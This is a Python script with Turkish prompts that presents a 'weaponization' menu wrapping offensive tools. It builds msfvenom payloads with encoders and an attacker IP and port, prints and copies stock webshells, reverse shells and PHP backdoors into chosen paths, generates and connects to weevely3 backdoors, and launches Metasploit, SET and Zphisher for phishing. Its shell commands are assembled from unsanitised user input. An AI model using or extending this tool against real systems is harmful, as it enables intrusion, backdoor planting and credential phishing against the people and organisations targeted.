from colorama import Fore, Back, Style
import time
import os
#msfvenom Fonksiyonları
def aix_listele():
    print("Aix Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep aix")
    print("\n")

def androdi_listele():
    print("Android Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep android")
    print("\n")

def apple_listele():
    print("Apple_ios Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep apple")
    print("\n")

def bsd_listele():
    print("Bsd Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep bsd")
    print("\n")

def cmd_listele():
    print("Cmd Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep cmd")
    print("\n")

def firefox_listele():
    print("Firefox Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep firefox")
    print("\n")

def generic_listele():
    print("Generic Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep generic")
    print("\n")

def java_listele():
    print("Java Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep java")
    print("\n")

def linux_lsitele():
    print("Linux Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep linux")
    print("\n")

def meterpreter_listele():
    print("Meterpreter Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep mutli/meterpreter")
    print("\n")

def mainframe_listele():
    print("Mainframe Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep mainframe")
    print("\n")

def nodejs_listele():
    print("Nodejs Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep nodejs")
    print("\n")

def osx_listele():
    print("OSx Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep osx")
    print("\n")

def php_lsitele():
    print("Php Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep php")
    print("\n")

def python_listele():
    print("Python Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep python")
    print("\n")

def ruby_listele():
    print("Ruby Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep ruby")
    print("\n")

def solaris_listele():
    print("Solaris Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep solaris")
    print("\n")

def tty_listele():
    print("Tty Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep tty")
    print("\n")

def windows_listele():
    print("Windows Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep windows")
    print("\n")

def payload_list():
    while True:
        print("""Payload türleri:\n
        1) Aix
        2) Android
        3) Apple_ios
        4) Bsd
        5) Cmd
        6) Firefox
        7) Generic
        8) Java 
        9) Linux
       10) Multi/Meterpreter
       11) Mainframe
       12) Nodejs
       13) Osx
       14) Php
       15) Python
       16) Ruby
       17) Solaris
       18) Tty
       19) Windows
       20) Önceki adım\n""")
        payload_list_secim = input(str("Listelemek istediğiniz payload türü(Önceki adım için '20' ya da 'g' basınız): "))
        print("\n")
        if payload_list_secim == '1':
            aix_listele()
        elif payload_list_secim == '2':
            androdi_listele()
        elif payload_list_secim == '3':
            apple_listele()
        elif payload_list_secim == '4':
            bsd_listele()
        elif payload_list_secim == '5':
            cmd_listele()
        elif payload_list_secim == '6':
            firefox_listele()
        elif payload_list_secim == '7':
            generic_listele()
        elif payload_list_secim == '8':
            java_listele()
        elif payload_list_secim == '9':
            linux_lsitele()
        elif payload_list_secim == '10':
            meterpreter_listele()
        elif payload_list_secim == '11':
            mainframe_listele()
        elif payload_list_secim == '12':
            nodejs_listele()
        elif payload_list_secim == '13':
            osx_listele()
        elif payload_list_secim == '14':
            php_lsitele()
        elif payload_list_secim == '15':
            python_listele()
        elif payload_list_secim == '16':
            ruby_listele()
        elif payload_list_secim == '17':
            solaris_listele()
        elif payload_list_secim == '18':
            tty_listele()
        elif payload_list_secim == '19':
            windows_listele()
        elif payload_list_secim == 'g' or payload_list_secim == '20':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)

def encoders_listele():
    print("Encoder'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l encoders")
    print("\n")

def nops_listele():
    print("Nop'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l nops")
    print("\n")

def platform_lsitele():
    print("Platform'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l platforms")
    print("\n")

def arch_listele():
    print("Arch'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l archs")
    print("\n")

def encrypt_listele():
    print("Encrypt'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l encrypts")
    print("\n")

def format_listele():
    print("Format'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l formats")
    print("\n")

def make_payload():
    while True:
        print("""
        1) Payload'ları listeleyip görmek
        2) Payload kullanmak(seçmek)
        3) Önce adım\n""")
        secim = input(str("Seçiminiz: "))
        print("\n")

        if secim == '1':
            payload_list()
        elif secim == "2":
            paylaod = input(str("Kullanmak istediğiniz paylaod (payload'ın tamamını yazın): "))
            print("\n")
            encoders_listele()
            encoder = input(str("Kullanmak istediğiniz encoder (encoder'ın tamamını yazın): "))
            print("\n")
            iterasyon = input(str("Kaç defa encode edilsin: "))
            print("\n")
            platform_lsitele()
            platform = input(str("Kullanmak istediğiniz platform (platformu tam adı ile yazın): "))
            print("\n")
            arch_listele()
            arch = input(str("Kullanmak istediğiniz arch (arch'ın tamamını yazın): "))
            print("\n")
            LHOST = input(str("Kullanmak istediğiniz local ip (saldırgan ip): "))
            print("\n")
            LPORT = input(str("Kullanmak istediğiniz port: "))
            print("\n")
            format_listele()
            format = input(str("Kullanmak istediğiniz formak (format'ın tamamını yazın): "))
            print("\n")
            path = input(str("Kaydedileceği yeri ve ismini yazınız(Örnek: /home/user/deneme.exe): "))
        elif secim == '3' or secim == 'g':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)



        os.system("msfvenom -p "+paylaod+" -e "+encoder+" -i "+iterasyon+" --platform "+platform+" -a "+arch+" LHOST="+LHOST+" LPORT="+LPORT+" -f "+format+" > "+path)

#------Diğer Fonksiyonlar------
def kopyala(klasorismi,dosyaismi):
    path = input(str("Kopyalanacak klasörün adını yolu ile birlikte giriniz(Örneğin: /home/user/deneme."+klasorismi+"): "))
    os.system("cp /opt/webshells/"+klasorismi+"/"+dosyaismi+" "+path)
    print(dosyaismi+" "+path+" şeklinde kaydedilmiştir.")
#------Silahlanma Fonksiyonları------

def msfvenom():
    while True:
        print(Fore.GREEN)
        os.system("figlet MSFVENOM")
        print(Fore.RESET)
        print("""
        1) Payloadları listele
        2) Encoder'ları listele
        3) Nop'ları listele
        4) Platformları listele
        5) Arch'ları listele
        6) Encrypt'ları listele
        7) Formatları listele
        8) Payload hazırla
        9) Önceki adım\n""")

        msfvenom_secim = input(str("Seçmek istediğiniz adım(Önceki adım için '4' ya da 'g' basınız): "))
        if msfvenom_secim == '1':
            payload_list()
        elif msfvenom_secim == '2':
            encoders_listele()
        elif msfvenom_secim == '3':
            nops_listele()
        elif msfvenom_secim == '4':
            platform_lsitele()
        elif msfvenom_secim == '5':
            arch_listele()
        elif msfvenom_secim == '6':
            encrypt_listele()
        elif msfvenom_secim == '7':
            format_listele()
        elif msfvenom_secim == '8':
            make_payload()
        elif msfvenom_secim == '9' or msfvenom_secim == 'g':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)


def webshells():
    while True:
        print(Fore.GREEN)
        os.system("figlet WEBSHELLS")
        print(Fore.RESET)
        print("""
       1) asp
       2) aspx
       3) cfm
       4) jsp
       5) perl
       6) php
       7) Bütün webshell'leri ağaç yapısında görmek için '8' basınız.
       8) Önceki adım\n""")
        webshells_secim = input(str("Kullanmak istediğiniz webshell (Önceki adıma dönmek için 'g' ya da '8' basınız): "))
        print("\n")
        time.sleep(0.2)

        if webshells_secim == '1':
            print("""
    1) cmd-asp-5.1.asp
    2) cmdasp.asp""")
            asp_secim = input(str("Görmek istediğiniz webshell: "))
            if asp_secim == '1':
                os.system("cat /opt/webshells/asp/cmd-asp-5.1.asp ")
                kopya_asp = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_asp == 'e':
                    kopyala("asp","cmd-asp-5.1.asp")
                elif kopya_asp == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            elif asp_secim == '2':
                os.system("cat /opt/webshells/asp/cmdasp.asp ")
                kopya_asp = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_asp == 'e':
                    kopyala("asp", "cmdasp.asp")
                elif kopya_asp == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            else:
                print(">>>>> Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.3)

        elif webshells_secim == '2':
            os.system("cat /opt/webshells/aspx/cmdasp.aspx ")
            kopya_aspx = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
            if kopya_aspx == 'e':
                kopyala("aspx", "cmdasp.aspx")
            elif kopya_aspx == 'h':
                print("\n")
                time.sleep(0.3)
            else:
                print(">>>>> Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.3)

        elif webshells_secim == '3':
            os.system("cat /opt/webshells/cfm/cfexec.cfm ")
            kopya_cfm = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
            if kopya_cfm == 'e':
                kopyala("cfm", "cfexec.cfm")
            elif kopya_cfm == 'h':
                print("\n")
                time.sleep(0.3)
            else:
                print(">>>>> Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.3)

        elif webshells_secim == '4':
            print("""
    1) cmdjsp.jsp
    2) jsp-reverse.jsp""")
            jsp_secim = input(str("Görmek istediğiniz webshell: "))
            if jsp_secim == '1':
                os.system("cat /opt/webshells/jsp/cmdjsp.jsp ")
                kopya_jsp = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_jsp == 'e':
                    kopyala("jsp", "cmdjsp.jsp")
                elif kopya_jsp == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            elif jsp_secim == '2':
                os.system("cat /opt/webshells/jsp/jsp-reverse.jsp ")
                kopya_jsp = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_jsp == 'e':
                    kopyala("jsp", "jsp-reverse.jsp")
                elif kopya_jsp == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            else:
                print(">>>>> Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.3)

        elif webshells_secim == '5':
            print("""
    1) perlcmd.cgi
    2) perl-reverse-shell.pl""")
            perl_secim = input(str("Görmek istediğiniz webshell: "))
            if perl_secim == '1':
                os.system("cat /opt/webshells/perl/perlcmd.cgi ")
                kopya_perl = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_perl == 'e':
                    kopyala("perl", "perlcmd.cgi")
                elif kopya_perl == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            elif perl_secim == '2':
                os.system("cat /opt/webshells/perl/perl-reverse-shell.pl ")
                kopya_perl = input(str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_perl == 'e':
                    kopyala("perl", "perl-reverse-shell.pl")
                elif kopya_perl == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            else:
                print(">>>>> Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.3)

        elif webshells_secim == '6':

            print("""
            1) findsocket
            2) php-backdoor.php
            3) php-reverse-shell.php
            4) qsd-php-backdoor.php
            5) simple-backdoor.php """)
            php_secim = input(str("Görmek istediğiniz webshell: "))
            if php_secim == '1':
                print("""
            1) findsock.c
            2) php-findsock-shell.php """)
                findsocket_secim = input(str("Kullanmak istediğiniz webshell: "))
                if findsocket_secim == '1':
                    os.system("cat /opt/webshells/php/findsocket/findsock.c ")

                    findsockc_kopya = input(
                        str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                    if findsockc_kopya == 'e':
                        kopyala("findsocket", "findsoc.c")
                    elif findsockc_kopya == 'h':
                        print("\n")
                        time.sleep(0.3)
                    else:
                        print(">>>>> Geçersiz girdi!!!")
                        print("\n")
                        time.sleep(0.3)
                elif findsocket_secim == '2':
                    os.system("cat /opt/webshells/php/findsocket/php-findsock-shell.php ")

                    php_findsock_kopya = input(
                        str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                    if php_findsock_kopya == 'e':
                        kopyala("php", "php-findsock-shell.php")
                    elif php_findsock_kopya == 'h':
                        print("\n")
                        time.sleep(0.3)
                    else:
                        print(">>>>> Geçersiz girdi!!!")
                        print("\n")
                        time.sleep(0.3)
            elif php_secim == '2':
                os.system("cat /opt/webshells/php/php-backdoor.php ")
                kopya_php_backdoor = input(
                    str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_php_backdoor == 'e':
                    kopyala("php", "php-backdoor.php")
                elif kopya_php_backdoor == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            elif php_secim == '3':
                os.system("cat /opt/webshells/php/php-reverse-shell.php ")
                kopya_php_reverse_shell = input(
                    str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_php_reverse_shell == 'e':
                    kopyala("php", "php-reverse-shell.php")
                elif kopya_php_reverse_shell == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            elif php_secim == '4':
                os.system("cat /opt/webshells/php/qsd-php-backdoor.php ")
                kopya_qsd_php_backdoor = input(
                    str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_qsd_php_backdoor == 'e':
                    kopyala("php", "qsd-php-backdoor.php")
                elif kopya_qsd_php_backdoor == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            elif php_secim == '5':
                os.system("cat /opt/webshells/php/simple-backdoor.php ")
                kopya_simple_backdoor = input(
                    str("Kopyalayıp kullanmak istiyor musunuz(evet için 'e', hayır için 'h' giriniz.): "))
                if kopya_simple_backdoor == 'e':
                    kopyala("php", "simple-backdoor.php")
                elif kopya_simple_backdoor == 'h':
                    print("\n")
                    time.sleep(0.3)
                else:
                    print(">>>>> Geçersiz girdi!!!")
                    print("\n")
                    time.sleep(0.3)
            else:
                print(">>>>>Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.5)

        elif webshells_secim == '7':
            os.system("tree /opt/webshells/")
        elif webshells_secim == '8' or webshells_secim == 'g':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)

def weevely3():
    while True:
        print(Fore.GREEN)
        os.system("figlet WEEVELY3")
        print(Fore.RESET)
        print("""
    1) Backdoor Oluşturma
    2) Backdoor Dinleme
    3) Önceki Adım\n""")
        time.sleep(0.2)
        weevely3_secim = input(str("Seçmek istediğiniz adım (Önceki adıma dönmek için '3' ya da 'g' basınız): "))
        try:
            if weevely3_secim == '1':
                back_passwd = input(str("Backdoor için şifre belirleyin: "))
                backdoor_isim = input(str("Backdoor ismini yolu ile birlikte giriniz(Örneğin: /home/user/deneme.php): "))
                os.system("python3 /opt/weevely3/weevely3.py generate "+back_passwd+" "+backdoor_isim)
            elif weevely3_secim == '2':
                url = input(str("Backdoor dosyasını yüklediğiniz url: "))
                dinle_passwd = input(str("Backdoor'unuzu oluştururken belirlediğiniz şifre: "))
                os.system("python3 /opt/weevely3/weevely3.py "+url+" "+dinle_passwd)
            elif weevely3_secim == '3' or weevely3_secim == 'g':
                time.sleep(0.2)
                break;
            else:
                print(">>>>>Geçersiz girdi!!!")
                print("\n")
                time.sleep(0.5)
        except:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)

def msfconsole():
    os.system("msfconsole")

def thescripter():
    os.system("thescripter")

def set():
    os.system("sudo setoolkit")

def zphisher():
    os.system("sudo zphisher")

def phishing():
    while True:
        print(Fore.GREEN)
        os.system("figlet Phishing")
        print(Fore.RESET)

        print("""
Phising adımını seçtiniz.\n
Phising adımında kullanabileceğiniz araçlar: \n
    1) Social Engineer Toolkit
    2) Zphisher
    3) Önceki adım""")
        phising_secim = input(str("Kullanmak istediğiniz araç (Önceki adıma dönmek için '3' ya da 'g' basınız): "))
        print("\n")
        if phising_secim == '1':
            set()
        elif phising_secim == '2':
            zphisher()
        elif phising_secim == '3' or phising_secim == 'g':
            time.sleep(0.2)
            break;
        else:
            print(">>>>> Geçersiz girdi.")

def weapon():

    while True:
        print(Fore.GREEN)
        os.system("figlet SILAHLANMA")
        print(Fore.RESET)

        print("""
Weaponization(Silahlanma) adımını seçtiniz.\n
Weaponization adımında kullanabileceğiniz araçlar: \n
    1) Metasploit-Framework
    2) Webshells
    3) Weevely
    4) The_Scripter
    5) Msfvenom
    6) Phishing tools
    7) Önceki adım""")
        secim = input(str("Kullanmak istediğiniz araç (Önceki adıma dönmek için 'g' ya da '7' basınız): "))
        print("\n")
        time.sleep(0.2)
        #msfconsole
        if secim == '1':
            msfconsole()
        #webshells
        elif secim == '2':
            webshells()
        #weevely3
        elif secim == '3':
            weevely3()
        #thescripter
        elif secim == '4':
            thescripter()
        #msfvenom
        elif secim == '5':
            msfvenom()
        #phising
        elif secim == '6':
            phishing()
        elif (secim == 'g' or secim == '7'):
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)

weapon()